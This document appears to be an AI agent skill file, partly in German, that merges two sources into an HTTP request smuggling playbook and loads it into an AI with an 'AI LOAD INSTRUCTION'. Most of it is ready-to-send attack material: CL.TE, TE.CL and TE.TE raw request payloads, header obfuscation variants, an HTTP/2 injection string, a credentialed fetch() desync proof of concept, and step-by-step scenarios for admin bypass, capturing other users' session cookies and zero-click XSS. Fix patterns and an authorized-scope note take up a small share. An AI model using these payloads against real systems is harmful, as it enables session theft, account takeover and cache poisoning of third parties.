---
name: request-smuggling
description: "HTTP request smuggling and desynchronization testing. Use when front proxies, CDNs, or load balancers disagree with the origin on message framing (Content-Length vs Transfer-Encoding), on HTTP/2→HTTP/1 translation, or when exploring client-side desync via browser fetch pipelines."
domain: web-injection
merged: true
merged_from: [hack-skills:request-smuggling, hacking-skills:http-request-smuggling]
---

# request-smuggling

> **Fusionierter Skill** — vereint 2 Quell-Skills zu einem: `hack-skills:request-smuggling`, `hacking-skills:http-request-smuggling`. Alle Techniken aller Quellen sind unten zusammengeführt, nichts ausgelassen.

## Quelle: hack-skills — request-smuggling (315 Zeilen)

# SKILL: HTTP Request Smuggling — Expert Attack Playbook

> **AI LOAD INSTRUCTION**: Expert HTTP desync techniques. Covers CL.TE, TE.CL, TE.TE obfuscation variants, HTTP/2 downgrade and pseudo-header confusion, client-side desync (browser `fetch` pipelines), and tool-assisted fuzzing. Assumes familiarity with raw HTTP/1.1 framing and reverse-proxy topologies. This is not “header injection” — it is **message boundary disagreement** between hops.

Routing note: load this skill when you suspect CDN/reverse-proxy and origin disagree on request-end boundaries, or when abnormal concatenation appears during H2-to-H1 downgrade.

## 0. RELATED ROUTING

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) when the HTTP client library is **Apache HttpClient <= 4.5.9** (HTTPCLIENT-1974/1978) — injecting `瘍瘊` (U+760D U+760A, low bytes `\r\n`) into a header value causes the underlying char-to-byte writer to emit a literal CRLF, splitting the request at the origin without relying on CL/TE disagreement

## 1. QUICK START

### CL.TE first probe (front-end trusts CL, back-end trusts chunked)

Assumption: front end prioritizes `Content-Length`, back end prioritizes `Transfer-Encoding: chunked`. Use a very short CL so the front end accepts a fake end, while the back end continues chunk parsing and leaves remaining bytes for the next request.

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

- Front end reads only 13 bytes based on `Content-Length: 13` (that is, `0\r\n\r\nSMUGGLED`, 13 bytes total) and considers the request complete.
- Back end parses as chunked: after the `0` end chunk, it treats **`SMUGGLED` and onward** as the start byte stream of the **next request**.

### TE.CL first probe (front-end trusts chunked, back-end trusts CL)

Assumption: front end parses chunked and back end only reads `Content-Length`. Set **CL equal to the number of bytes in the chunk-length line** (commonly `4`: two hex characters + `\r\n`), so the back end consumes only the length line and leaves the rest buffered for follow-up request splicing.

Embed a second request in the chunk (all line endings are **CRLF**; `35` hex chunk length = 53 bytes):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

On the wire, the chunk body must be exactly 53 bytes; if you change path/headers, recalculate chunk length and update the hex length line accordingly.

### Safety note

Test only within **authorized scope**; concurrent smuggling can poison connection pools, corrupt caches, or impact other tenants. Prefer isolated environments or low-traffic windows.

---

## 1. CORE CONCEPT

**Definition**: two (or more) HTTP processing entities disagree on where request one ends and request two begins in the **same TCP/TLS stream**, allowing an attacker to include a **partial or full** second request inside one logical request.

```
  Client          Front (proxy/WAF)              Back (origin)
     |                     |                            |
     |==== Request A+B ===>|                            |
     |                     | parses boundary #1         | parses boundary #2
     |                     |         \                  |         /
     |                     |          different split points
     |                     |                            |
     v                     v                            v
                   Request A (seen)              Request A' + smuggled B
```

**Difference from CRLF injection**: CRLF usually injects into **responses** or **header lines**; smuggling targets implementation differences in **RFC 7230 message framing** (`Content-Length` / `chunked`).

**High-value impact**: WAF rule bypass (smuggled body not visible in front-end request), hijacking other users' requests on shared-origin connections (queue poisoning), cache-poisoning assistance, and authentication-boundary confusion.

---

## 2. CL.TE VULNERABILITIES

**Pattern**: front end trusts **`Content-Length`**; back end trusts **`Transfer-Encoding: chunked`**.

**Exact example** (same as §0): `Content-Length: 13` and `Transfer-Encoding: chunked` both exist, body is:

```text
0\r\n\r\nSMUGGLED
```

Byte count: `0` + `\r\n` + `\r\n` + `SMUGGLED` = 13.

**Back-end perspective**: the chunked stream ends at `0\r\n\r\n`; if `SMUGGLED` starts with `METHOD SP` or another valid request prefix, it becomes a **smuggled request-line prefix**.

**Tuning**: if the target is sensitive to duplicate headers, casing, or spaces, minimally adjust `Transfer-Encoding` variants (see §4) while preserving semantics to match a combo where front end ignores TE and back end executes TE.

---

## 3. TE.CL VULNERABILITIES

**Pattern**: front end parses **chunked**; back end only reads **`Content-Length`** (or too-short CL).

**Intent**: front end treats the whole malicious byte stream as body; back end reads only CL length, leaving remaining bytes buffered to splice with later legitimate requests.

**Full TE.CL with embedded second request** (same family as §0; `Content-Length: 4` + first chunk-length line `35\r\n`):

```http
POST / HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded
Content-Length: 4
Transfer-Encoding: chunked

35
GET /admin HTTP/1.1
Host: target.example
Foo: x

0


```

Explanation:

- **Back end (CL)**: reads only 4 bytes from the message body start -> `3` `5` `\r` `\n`, marks body complete, and leaves the remaining bytes in the TCP read buffer.
- **Front end (TE)**: parses full stream as chunked and forwards/consumes `GET /admin...` as body content of the **already-closed first request** (product-dependent); mismatch with back-end boundary interpretation forms TE.CL.

For longer smuggling (e.g., `POST` + `Content-Length: 11` + `x=1`), chunk length is about `76` (hex `0x76` = 118 bytes); `Content-Length: 4` can still pin the back end to reading only the length line.

**Practical notes**: chunk length must be valid hex; second request must meet target expectations for Host, path, and session cookie; timing window and connection-reuse strategy determine whether you hit another user's request.

---

## 4. TE.TE VULNERABILITIES

**Pattern**: both front and back claim to process `Transfer-Encoding`, but differ on which TE value is effective or valid -> still producing equivalent desync where one side sees chunked and the other does not.

Use the following **8 obfuscation variants** to probe parser differentials (single-line display; `\t` means a real TAB):

```http
Transfer-Encoding: xchunked
```

```http
Transfer-Encoding : chunked
```

```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
```

```http
Transfer-Encoding: x
```

```http
Transfer-Encoding:[TAB]chunked
```
(Replace `[TAB]` with real `\x09`.)

```http
 Transfer-Encoding: chunked
```
(One leading space at line start.)

```http
X: X
Transfer-Encoding: chunked
```
(Previous line value is `X` and next line starts with `Transfer-Encoding`: this uses **line continuation / lenient header parsing** so one hop may merge or split lines incorrectly; separator between `X` and `Transfer-Encoding` may be `\n` or `\r\n` depending on the target stack.)

```http
Transfer-Encoding
: chunked
```
(Field name and colon are on **different physical lines**; some parsers still treat it as valid `Transfer-Encoding: chunked`.)

**Strategy**: for each (front, back) pair, enumerate which side accepts each variant as `chunked`, then map to equivalent CL.TE or TE.CL using §2/§3.

---

## 5. HTTP/2 REQUEST SMUGGLING

### H2 -> H1 Downgrade

Common scenario: edge supports HTTP/2 and origin uses HTTP/1.1. If implementation does not strictly normalize header fields and body boundaries, you may observe:

- incorrect pseudo-header to regular-header mapping order;
- forbidden headers (such as some `Connection` combinations) forwarded incorrectly;
- duplicate-header merge rules inconsistent with the origin.

### Pseudo-header / header-injection smuggling (concept payload)

Attack surface comes from downstream H1 parsers treating certain bytes as the **start of a new request**. A common research/CTF approach is to place near-request bytes inside header values that one layer ignores but another treats literally:

```text
header ignored\r\n\r\nGET / HTTP/1.1\r\nHost: target
```

**Meaning**: if one hop keeps the full string in a header value and the next hop mis-splits during H1 reconstruction, parsing may start a new `GET / HTTP/1.1` at `\r\n\r\n`.

**Testing directions**:

- duplicate and case handling for `Transfer-Encoding` / `Content-Length` in H2 (H2 requires lowercase, but translation layers can fail);
- downgrade behavior when `:method` or `:path` includes abnormal characters;
- interactions between tunneling or extended CONNECT and smuggling.

---

## 6. CLIENT-SIDE DESYNC

**Scenario**: browser request-body handling differs from middleware/origin, or **`no-cors` + preflight exemptions** permit atypical messages that create queue effects similar to classic CL.TE/TE.CL (architecture-dependent).

**HEAD + GET chain**: some stacks historically mishandle HEAD response bodies, later pipelining, or connection reuse; validate with concrete browser versions and target proxy behavior.

**JavaScript PoC shape** (illustrative: set body to raw bytes containing `GET`, with `no-cors` and credentials):

```javascript
fetch("https://target.example/vulnerable", {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  body: "GET /admin HTTP/1.1\r\nHost: target.example\r\n\r\n"
});
```

**Note**: browser security model limits direct readability; success often appears as side effects on other requests over the same connection or as abnormal server logs/behavior, not direct response reading. Evaluate with SOP, CORS, and extension/proxy factors.

---

## 7. TOOLS

| Tool | Purpose |
|------|------|
| **Burp Suite — HTTP Request Smuggler** (BApp Store) | Automated desync detection, common variants, timing-delta checks |
| **defparam/smuggler** (GitHub) | Python scripts for batch generation/sending of smuggling probes |
| **dhmosfunk/simple-http-smuggler-generator** (GitHub) | Quickly assemble raw CL.TE / TE.CL message templates |

**Usage advice**: first passively confirm a **front-end + origin** two-hop path, then select minimally disruptive probes, and lower concurrency in production.

---

## 8. DETECTION DECISION TREE

```
                        Start: reverse proxy / CDN in path?
                                    |
                    NO -------------+------------- YES
                    |                               |
            Low classic smuggling                    |
            (still test H2 desync)                   v
                                            Can you send TE + CL together?
                                                    |
                              NO -------------------+------------------- YES
                              |                                         |
                      Test H2-only issues                    Front prefers which?
                      (pseudo-header, reset)                            |
                                        +-------------------------------+-------------------------------+
                                        |                               |                               |
                                   CL wins                          TE wins                         errors /
                                        |                               |                          connection
                                        v                               v                               |
                                   CL.TE probes                    TE.CL probes                    TE.TE obfuscation
                                   (Sec 0,2)                       (Sec 0,3)                       (Sec 4)
                                        |                               |                               |
                                        v                               v                               v
                              Time / content /                    Adjust chunk                     Pairwise matrix:
                              queue poisoning                     sizes + CL                      which hop accepts
                              signals?                            alignment                       which variant?
                                        |                               |                               |
                                        +-------------------------------+-------------------------------+
                                                                        |
                                                                        v
                                                              Confirm with second request
                                                              smuggled (replay-safe)
                                                              or Collaborator-style side signal
```

---

### Advanced Reference

Also load [H2_SMUGGLING_VARIANTS.md](./H2_SMUGGLING_VARIANTS.md) when you need:
- H2.CL and H2.TE variants with byte-level payload examples
- CL.0 (connection close desync) — technique and detection
- Fat GET request smuggling (body in GET request)
- Request smuggling → cache poisoning chain (response queue misalignment)
- Client-side desync (CSD) via browser Fetch API with JavaScript PoC templates
- CDN/reverse proxy product behavior matrix (HAProxy, Nginx, Apache, Cloudflare, AWS ALB, Envoy, Varnish, etc.)

---

## 12. RELATED ROUTING

- **Input enters interpreter/query language/template** (not HTTP framing) -> [Injection Testing Router](../injection-checking/SKILL.md) (then drill down into XSS, SQLi, SSTI, etc.).
- **Response header splitting / Location CRLF** -> [CRLF Injection](../crlf-injection/SKILL.md).
- **Cache and path-key confusion** -> [Web Cache Deception](../web-cache-deception/SKILL.md).

Once confirmed as an **HTTP message-boundary** issue rather than parameter injection, **stay in this skill** to avoid misrouting into general injection workflows.

## Quelle: hacking-skills — http-request-smuggling (148 Zeilen)

# HTTP Request Smuggling

## What Is Broken and Why
HTTP request smuggling arises from ambiguity in how HTTP/1.1 allows both `Content-Length` and `Transfer-Encoding` headers simultaneously. When a front-end proxy and back-end server disagree on which header takes precedence, an attacker can craft a request whose body is interpreted differently by each hop. The "leftover" bytes from one request are prepended to the next user's request, allowing attackers to poison the request pipeline, bypass security controls, hijack sessions, and perform reflected XSS without user interaction.

## Key Signals
- Application sits behind a reverse proxy, load balancer, or CDN
- Delayed response to a crafted request with conflicting length headers (timing-based detection)
- Different HTTP response when `Transfer-Encoding: chunked` and `Content-Length` headers are both present
- `400 Bad Request` or `500` from back-end on specific header combinations
- Burp's HTTP Request Smuggler extension flagging the endpoint
- Front-end rewrites or strips certain headers (evidence in `X-Forwarded-*` reflection)

## Methodology
1. Identify endpoints that pass through a proxy/CDN layer.
2. Send a CL.TE detection probe: include both `Content-Length` and `Transfer-Encoding: chunked` with conflicting values; observe timing and response differences.
3. Send a TE.CL detection probe: `Transfer-Encoding` terminates the body early, `Content-Length` extends it.
4. Confirm vulnerability with a harmless poisoning request that prepends a known prefix to the next request.
5. Escalate based on what prefix is prepended (bypass access controls, capture requests, perform SSRF, etc.).
6. Use Burp's HTTP Request Smuggler extension to automate detection across all methods.

## Payloads & Tools
```
# CL.TE probe (front-end uses Content-Length, back-end uses Transfer-Encoding)
# Send with Content-Length: 6 but chunked body terminator at byte 3
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

3
abc
0


# TE.CL probe (front-end uses Transfer-Encoding, back-end uses Content-Length)
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


# Access control bypass — smuggle request to restricted endpoint
POST / HTTP/1.1
Host: TARGET
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: TARGET
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1

# Capture next user's request (poison with open POST)
POST / HTTP/1.1
Host: TARGET
Content-Length: 198
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: TARGET
Content-Length: 400
Cookie: session=TOKEN

csrf=TOKEN2&postId=5&name=carlos&email=foo%40bar.com&comment=

# Burp Suite HTTP Request Smuggler extension
# Extensions -> HTTP Request Smuggler -> Smuggle Probe
# Run against target host to auto-detect CL.TE, TE.CL, TE.TE variants

# TE.TE obfuscation variants to bypass front-end normalization
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
 Transfer-Encoding: chunked
X: X\nTransfer-Encoding: chunked
Transfer-Encoding
 : chunked
```

## Bypass Techniques
- TE.TE obfuscation: send two `Transfer-Encoding` headers, one with a non-standard value, to make one server ignore it
- Whitespace manipulation in header values: `Transfer-Encoding: chunked ` (trailing space), `Transfer-Encoding:\tchunked`
- Header line folding (obsolete but sometimes accepted): newline + space in header continuation
- Mixed case: `Transfer-Encoding: Chunked`
- Duplicate headers with different values to exploit server-specific precedence rules
- HTTP/2 downgrade: some H2-to-H1 translation proxies introduce smuggling opportunities

## Exploitation Scenarios
**Scenario 1 — Admin Panel Access Control Bypass**
Setup: Front-end proxy blocks direct access to `/admin` based on IP. CL.TE smuggling confirmed.
Trigger: Smuggle `GET /admin HTTP/1.1` as the body prefix; next legitimate request is interpreted by the back-end as following the smuggled admin request.
Impact: Unauthenticated access to administrative functionality restricted by front-end IP filtering.

**Scenario 2 — Session Hijacking via Request Capture**
Setup: TE.CL vulnerability on a comment submission endpoint; attacker is authenticated.
Trigger: Poison the pipeline with an incomplete POST body pointing to the comment field; next user's request (including their session cookie and body) is appended to the comment body and stored.
Impact: Another user's session token and request data captured and stored, enabling full account takeover.

**Scenario 3 — Reflected XSS Without Victim Interaction**
Setup: CL.TE smuggling on application that reflects request URL in 404 responses.
Trigger: Smuggle a GET request with an XSS payload in the URL as a prefix; next user's normal request is processed with the XSS prefix prepended to their URL path.
Impact: Victim receives a 404 response containing reflected XSS payload, executing in their browser.

## False Positives
- Timing differences caused by network latency rather than pipeline desync
- Back-end returning 400 for chunked encoding due to intentional rejection (not necessarily exploitable desync)
- Responses varying due to load balancer sending requests to different back-end instances
- WAF returning 400 before the request reaches the vulnerable server pair

## Fix Patterns
- Ensure front-end and back-end servers use the same HTTP version and header parsing rules
- Configure front-end proxy to normalize ambiguous requests before forwarding (reject or rewrite conflicting CL/TE)
- Reject requests containing both `Content-Length` and `Transfer-Encoding` headers
- Use HTTP/2 end-to-end (H2C) between front-end and back-end to eliminate HTTP/1.1 ambiguity
- Enable strict request parsing on back-end web servers (reject malformed chunked encoding)
- Keep proxy and server software updated to versions with smuggling protections

## Related Skills

HTTP request smuggling can pivot into [[ssrf]] by prepending a smuggled request that reaches internal back-end services inaccessible from the internet. Capturing another user's request via the pipeline poison technique is functionally a session hijack, which overlaps with [[cookie-attacks]]. The reflected XSS variant of smuggling (injecting an XSS prefix that the next user's response inherits) is a delivery mechanism for [[xss-reflected]] that bypasses WAFs entirely because the XSS payload never appears in the victim's original request.
